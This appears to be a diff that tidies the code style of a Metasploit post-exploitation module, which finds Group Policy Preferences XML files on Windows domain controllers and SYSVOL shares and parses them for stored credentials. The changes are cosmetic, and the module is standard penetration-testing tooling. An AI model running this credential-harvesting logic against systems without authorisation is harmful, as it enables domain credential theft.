@@ -44,6 +44,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -76,31 +81,31 @@ class MetasploitModule < Msf::Post
     basepaths = []
     fullpaths = []
 
-    print_status 'Checking for group policy history objects...'
+    print_status('Checking for group policy history objects...')
     all_users = get_env('%ALLUSERSPROFILE%')
 
     unless all_users.include? 'ProgramData'
       all_users = "#{all_users}\\Application Data"
     end
 
-    cached = get_basepaths("#{all_users}\\Microsoft\\Group Policy\\History", true)
+    cached = get_basepaths("#{all_users}\\Microsoft\\Group Policy\\History", cached: true)
 
     unless cached.blank?
       basepaths << cached
-      print_good 'Cached Group Policy folder found locally'
+      print_good('Cached Group Policy folder found locally')
     end
 
-    print_status 'Checking for SYSVOL locally...'
+    print_status('Checking for SYSVOL locally...')
     system_root = expand_path('%SYSTEMROOT%')
     locals = get_basepaths("#{system_root}\\SYSVOL\\sysvol")
     unless locals.blank?
       basepaths << locals
-      print_good 'SYSVOL Group Policy Files found locally'
+      print_good('SYSVOL Group Policy Files found locally')
     end
 
     # If user supplied domains this implicitly cancels the ALL flag.
     if datastore['ALL'] && datastore['DOMAINS'].blank?
-      print_status 'Enumerating Domains on the Network...'
+      print_status('Enumerating Domains on the Network...')
       domains = enum_domains
       domains.reject! { |n| n == 'WORKGROUP' || n.to_s.empty? }
     end
@@ -108,19 +113,19 @@ class MetasploitModule < Msf::Post
     # Add user specified domains to list.
     unless datastore['DOMAINS'].blank?
       if datastore['DOMAINS'].match(/\./)
-        print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
+        print_error("DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'.")
         return
       end
       user_domains = datastore['DOMAINS'].split(' ')
       user_domains = user_domains.map(&:upcase)
-      print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
+      print_status("Enumerating the user supplied Domain(s): #{user_domains.join(', ')}...")
       user_domains.each { |ud| domains << ud }
     end
 
     # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
     # If user supplied domains we do not wish to enumerate registry retrieved domains.
     if locals.blank? && user_domains.blank?
-      print_status 'Enumerating domain information from the local registry...'
+      print_status('Enumerating domain information from the local registry...')
       domains << get_domain_reg
     end
 
@@ -136,7 +141,7 @@ class MetasploitModule < Msf::Post
       dcs = [] if dcs.nil?
 
       # Add registry cached DC for the test case where no DC is enumerated on the network.
-      if !cached_dc.nil? && (cached_dc.include? domain)
+      if !cached_dc.nil? && cached_dc.include?(domain)
         dcs << cached_dc
       end
 
@@ -145,13 +150,13 @@ class MetasploitModule < Msf::Post
       dcs.uniq!
       tbase = []
       dcs.each do |dc|
-        print_status "Searching for Policy Share on #{dc}..."
+        print_status("Searching for Policy Share on #{dc}...")
         tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
         # If we got a basepath from the DC we know that we can reach it
         # All DCs on the same domain should be the same so we only need one
         next if tbase.blank?
 
-        print_good "Found Policy Share on #{dc}"
+        print_good("Found Policy Share on #{dc}")
         basepaths << tbase
         break
       end
@@ -159,7 +164,7 @@ class MetasploitModule < Msf::Post
 
     basepaths.flatten!
     basepaths.compact!
-    print_status 'Searching for Group Policy XML Files...'
+    print_status('Searching for Group Policy XML Files...')
     basepaths.each do |policy_path|
       fullpaths << find_path(policy_path, group_path)
       fullpaths << find_path(policy_path, group_path_user)
@@ -179,7 +184,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def get_basepaths(base, cached = false)
+  def get_basepaths(base, cached: false)
     locals = []
     begin
       session.fs.dir.foreach(base) do |sub|
@@ -266,7 +271,7 @@ class MetasploitModule < Msf::Post
 
   def parse_xml(xmlfile)
     mxml = xmlfile[:xml]
-    print_status "Parsing file: #{xmlfile[:path]} ..."
+    print_status("Parsing file: #{xmlfile[:path]} ...")
     filetype = File.basename(xmlfile[:path].gsub('\\', '/'))
     results = Rex::Parser::GPP.parse(mxml)
 
@@ -274,7 +279,7 @@ class MetasploitModule < Msf::Post
 
     tables.each do |table|
       table << ['NAME', xmlfile[:name]] if xmlfile.member?(:name)
-      print_good " #{table}\n\n"
+      print_good(" #{table}\n\n")
     end
 
     results.each do |result|
@@ -350,7 +355,7 @@ class MetasploitModule < Msf::Post
     else
       hostnames = []
       results.each do |dc|
-        print_good "DC Found: #{dc[:name]}"
+        print_good("DC Found: #{dc[:name]}")
         hostnames << dc[:name]
       end
     end
@@ -364,7 +369,7 @@ class MetasploitModule < Msf::Post
     subkey = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\'
     v_name = 'DCName'
     dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
-    print_status "Retrieved DC #{dc} from registry"
+    print_status("Retrieved DC #{dc} from registry")
     return dc
   rescue StandardError
     print_status('No DC found in registry')
@@ -401,7 +406,7 @@ class MetasploitModule < Msf::Post
     end
 
     domains.uniq!
-    print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
+    print_status("Retrieved Domain(s) #{domains.join(', ')} from registry")
 
     return domains
   end
